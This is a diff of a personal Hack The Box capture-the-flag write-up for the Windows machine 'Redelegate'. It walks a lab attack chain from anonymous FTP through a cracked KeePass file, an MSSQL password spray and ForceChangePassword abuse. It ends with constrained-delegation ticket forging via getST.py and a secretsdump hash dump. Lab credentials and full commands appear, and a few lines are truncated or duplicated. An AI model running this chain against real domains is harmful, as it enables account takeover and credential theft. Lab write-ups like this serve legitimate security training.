@@ -9,18 +9,21 @@ tags:
   - HTB
   - windows
   - hard
-lastmod: 2026-02-06T22:43:56.607Z
+  - ftp-anonymous-login
+  - password-deformation
+  - decode-kdbx
+  - mssql-login
+  - account-bruteforce
+  - bloodhound
+  - bloodhound-ForceChangePassword
+  - Lateral-Movement-5985
+  - windows-privilege-escalation-SeEnableDelegationPrivilege
+  - impersonate-token
+lastmod: 2026-02-07T04:00:00.436Z
 ---
 # Box Info
 
-```
 Redelegate is a hard-difficultly Windows machine that starts with Anonymous FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the `HelpDesk` group, the newly compromised user account `Marie.Curie` has a `User-Force-Change-Password` Access Control setup over the `Helen.Frost` user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The `Helen.Frost` user account also has the `SeEnableDelegationPrivilege` assigned and has full control over the `FS01$` machine account, essentially allowing the attacker account to modify the `msDS-AllowedToDelegateTo` LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.
-
-Redelegate 是一台困難的 Windows 機器，起始於匿名 FTP 存取，攻擊者可下載敏感的 Keepass 資料庫檔案。攻擊者隨後發現資料庫中的憑證可用於 MSSQL 本地登入，進而列舉 SID，並執行密碼噴射攻擊。作為`客服台`群組成員，新被入侵的使用者帳號 `Marie.Curie` 在 `Helen.Frost` 用戶帳號上設置了使用者`強制更改密碼存取控制（User-Forced Change-Password` Access Control）;該使用者帳號有權限將 PS 遠端連線連線到 Domain Controller。`Helen.Frost` 使用者帳號同時被指派了 `SeEnableDelegationPrivilege`，並完全控制 `FS01$` 機器帳號，實質上允許攻擊者帳號修改 `msDS-AllowedToDelegateTo` LDAP 屬性，並更改電腦物件的密碼，並執行受限委派攻擊。
-```
-
-\#FTP #mssqlclient #mssql\_1443 #rustholund-ce #bloodhound #evil-winrm-py #ForceChangePassword #wmiexec #getST #SeEnableDelegationPrivilege #kdbx #keepass #mssqlclient\_username\_brute\_force #mssql\_enum\_domain\_accounts\
-\#brute-force #keepass2john
 
 ***
 
@@ -154,28 +157,56 @@ Nmap done: 1 IP address (1 host up) scanned in 75.86 seconds
 
 # Shell as SQLGuest
 
-### FTP 21 -- Scans
+### FTP 21
 
-* [Create Wordlist](/Create%20Wordlist) --> [FTP 21#FTP 爆破登入](FTP%2021#FTP%20%E7%88%86%E7%A0%B4%E7%99%BB%E5%85%A5)
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "ftp-anonymous-login" >}} Success login as `anonymous` for enumerating with binary mode to get the Shared.kdbx etc files.
+
+{{< /toggle >}}
 
 ```
 └─#  ftp 10.129.234.50
 Connected to 10.129.234.50.
 220 Microsoft FTP Service
-Name (10.129.234.50:root): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
+Name (10.129.234.50:root): 
+cess allowed, send identity (e-mail name) as password.
 Password: 
 230 User logged in.
 Remote system type is Windows_NT.
 ftp> 
 ```
 
-It’s important to put FTP into `binary` mode before transferring, or the binary Keepass DB can be messed up. , got the `CyberAudit.txt` , `Shared.kdbx` , `TrainingAgenda.txt`\
-![Pasted image 20260124125555.png](/ob/Pasted%20image%2020260124125555.png)
+It’s important to put FTP into `binary` mode before transferring, or the binary Keepass DB can be messed up. , got the `CyberAudit.txt` , `Shared.kdbx` , `TrainingAgenda.txt`
 
 ```
-binary
+ftp> binary
+200 Type set to I.
+ftp> prompt off
+Interactive mode off.
+ftp> mget *
+local: CyberAudit.txt remote: CyberAudit.txt
+229 Entering Extended Passive Mode (|||56198|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************|   434        4.56 KiB/s    00:00 ETA 
+226 Transfer complete.
+434 bytes received in 00:00 (4.55 KiB/s)
+local: Shared.kdbx remote: Shared.kdbx
+229 Entering Extended Passive Mode (|||56199|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************|  2622       27.34 KiB/s    00:00 ETA 226 Transfer complete.
+2622 bytes received in 00:00 (27.28 KiB/s)                         
+local: TrainingAgenda.txt remote: TrainingAgenda.txt
+229 Entering Extended Passive Mode (|||56200|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************|   580        6.11 KiB/s    00:00 ETA
+226 Transfer complete.
+580 bytes received in 00:00 (6.09 KiB/s)
 ```
+
+![Pasted image 20260124125555.png](/ob/Pasted%20image%2020260124125555.png)
+
+mention the Weak User Passwords
 
 ```└─# cat CyberAudit.txt    
 OCTOBER 2024 AUDIT FINDINGS
@@ -194,6 +225,8 @@ OCTOBER 2024 AUDIT FINDINGS
 3) Remove unused objects in the domain: IN PROGRESS
 4) Recheck ACLs: IN PROGRESS
 ```
+
+mention the Weak Passwords is SeasonYear!
 
 ```shell
 ─# cat TrainingAgenda.txt    
@@ -217,6 +250,12 @@ Friday 25th October | 9.30 - 12.30 - 29 attendees
 
 ### Password deformation
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "password-deformation" >}} Found weak password in the ftp share file TrainingAgenda.txt - SeasonYear! , so can be guess the password
+
+{{< /toggle >}}
+
 ```
 └─# cat password 
 SeasonYear!
@@ -230,12 +269,16 @@ Autumn2024!
 
 ### keepass2john
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "decode-kdbx" >}} use the keepass2john to hash the Shared.kdbx for hashcat to decode the password with the mode 13400 ,so get the mssql password in the keepass database with the SQLGuest
+
+{{< /toggle >}}
+
 ```
 ┌──(haydon_env)─(root㉿kali)-[~/Desktop]
 └─# keepass2john Shared.kdbx | tee Shared.kdbx.hash
-                                                                                                      
-
-
+                                                                        
 ```
 
 hashcat
@@ -315,7 +358,48 @@ got the account `SQLGuest:zDPBpaF4FywlqIv11vii`
 
 ![Pasted image 20260124170307.png](/ob/Pasted%20image%2020260124170307.png)
 
+`keepassxc.cli` can dump the full DB in one command line:
+
+```shell
+oxdf@hacky$ echo 'Fall2024!' | keepassxc.cli export Shared.kdbx --format csv
+Enter password to unlock Shared.kdbx: 
+KdbxXmlReader::readDatabase: found 1 invalid group reference(s)
+"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
+"Shared/IT","FTP","FTPUser","SguPZBKdRyxWzvXRWy6U","","Deprecated","","0","2024-10-20T07:56:58Z","2024-10-20T07:56:20Z"
+"Shared/IT","FS01 Admin","Administrator","Spdv41gg4BlBgSYIW1gF","","","","0","2024-10-20T07:57:21Z","2024-10-20T07:57:02Z"
+"Shared/IT","WEB01","WordPress Panel","cn4KOEgsHqvKXPjEnSD9","","","","0","2024-10-20T08:00:25Z","2024-10-20T07:57:24Z"
+"Shared/IT","SQL Guest Access","SQLGuest","zDPBpaF4FywlqIv11vii","","","","0","2024-10-20T08:27:09Z","2024-10-20T08:26:48Z"
+"Shared/HelpDesk","KeyFob Combination","","22331144","","","","0","2024-10-20T12:12:32Z","2024-10-20T12:12:09Z"
+"Shared/Finance","Timesheet Manager","Timesheet","hMFS4I0Kj8Rcd62vqi5X","","","","0","2024-10-20T12:14:18Z","2024-10-20T12:13:30Z"
+"Shared/Finance","Payrol App","Payroll","cVkqz4bCM7kJRSNlgx2G","","","","0","2024-10-20T12:14:11Z","2024-10-20T12:13:50Z"
+```
+
 ### mssqlclient.py
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "mssql-userenum" >}} use the netexec of --local-auth to verify the account and use the mssqlclient.py to local login to get thefull RID and the msfconsole will help we to auto enum the users
+
+{{< /toggle >}}
+
+Most of the creds don’t seem valid to anything I have access to at this point. The MSSQL creds do not work for SMB or as a Windows account:
+
+```
+oxdf@hacky$ netexec smb dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.50   445    DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE 
+```
+
+But with the `--local-auth` flag, they do work for the DB:
+
+```
+oxdf@hacky$ netexec mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii
+MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
+oxdf@hacky$ netexec mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
+MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+```
 
 ```shell
 └─# mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl
@@ -333,12 +417,10 @@ SQL (SQLGuest  guest@master)>
 
 ```
 
-As an attacker that knows nothing about the environment we’ll need to start by getting the domain name of the SQL Server using the query below.
+As an attacker that knows nothing about the environment we’ll need to start by getting the domain name of the SQL Server using the query below.\
+[This post](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda) from NetSPI goes into different ways to enumerate an MSSQL server. Four sections are on enumerating domain accounts. I’ll show two of these.
 
 ```
-SELECT DEFAULT_DOMAIN() as mydomain;
-
-
 SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN() as mydomain;
 mydomain     
 ----------   
@@ -356,8 +438,6 @@ b'010500000000000515000000a185deefb22433798d8e847a00020000'
 ```
 
 i get nothing form here,eg database run the command  , but https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda  show that i can enum the users.
-
-# Shell as Marie.Curie
 
 ### mssql user enum
 
@@ -441,6 +521,8 @@ msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
 
 ```
 
+# Shell as Marie.Curie
+
 The username list
 
 ```
@@ -485,6 +567,11 @@ sql_svc
 
 ### netexec bruteforce continue-on-success
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "account-bruteforce" >}} use the username : username wordlist to login successfully\
+{{< /toggle >}}
+
 always keep the password list is good thing , if use the password before , the next password enum may be is the same
 
 ```
@@ -505,6 +592,12 @@ The `netexec` show that i can rdp in , but i cant in , so the idea is run the bl
 
 ### rusthound-ce
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "bloodhound" >}} Install and run the rusthound-ce to collect the data from linux
+
+{{< /toggle >}}
+
 use the netexec amd bloodhound-python also has the problem to collect the data , so use the rusthound-ce to collect the data
 
 ```
@@ -522,6 +615,12 @@ tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
 # Shell as MARIE.CURLE
 
 ### bloodhound
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "bloodhound-ForceChangePassword" >}} The user has the ForceChangePassword to other user but need to check which account has the outblood dierection
+
+{{< /toggle >}}
 
 The bloodhound show that MARIE.CURIE show that there are a lot of ForceChangePassword , but only the `HELEN.FORST`  has the outblood dierection
 
@@ -544,6 +643,12 @@ CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed pas
 # Shell as helen.frost
 
 ### evil-winrm-py
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-5985" >}} login with evil-winrm-py which has more stable to login
+
+{{< /toggle >}}
 
 Load PowerShell functions from local scripts into the interactive shell. 🆕\
 Run local PowerShell scripts on the remote host. 🆕\
@@ -569,6 +674,12 @@ evil-winrm-py PS C:\Users\Helen.Frost\Documents>
 ```
 
 ### SeEnableDelegationPrivilege (To-be finish)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "windows-privilege-escalation-SeEnableDelegationPrivilege" >}} exploit constrained delegation by set up the TrustedToAuthForDelegation to set object msDS-AllowedToDelegateTo
+
+{{< /toggle >}}
 
 To exploit unconstrained delegation, I would typically add a computer account and a DNS record, set that computer up for unconstrained delegation, and then coerce the DC to authenticate to it. Unfortunately the `MachineAccountQuota` for this domain is 0:
 
@@ -614,8 +725,12 @@ bloodyAD --host 10.129.234.50  -d redelegate.vl -u Helen.Frost -p 'Fall2024!' se
 
 ### getST.py
 
-Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.
+{{< toggle "Tag 🏷️" >}}
 
+{{< tag "impersonate-token" >}}  impersonate the Administrator account and request a Service Ticket on its behalf for the www service on host server01.test.local\
+{{< /toggle >}}
+
+Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.\
 -spn\
 -impersonate
 
@@ -634,11 +749,27 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 ```
+getST.py 'redelegate.vl/FS01$:Password123' -spn ldap/dc.redelegate.vl -impersonate dc
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating dc
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
+```
+
+This saves a ticket that I can use to authenticate to the LDAP service on the DC as the DC machine account. I’ll use that to dump the hashes:
+
+```
 getST.py -spn ldap/dc.redelegate.vl 'redelegate.vl/FS01$:Password123'  -dc-ip 10.129.234.50
 ```
 
+This saves a ticket that I can use to authenticate to the LDAP service on the DC as the DC machine account. I’ll use that to dump the hashes:
+
 ```
-export KRB5CCNAME=FS01\$.ccache
+KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache secretsdump.py -k -no-pass dc.redelegate.vl
 ```
 
 # Shell as Admin
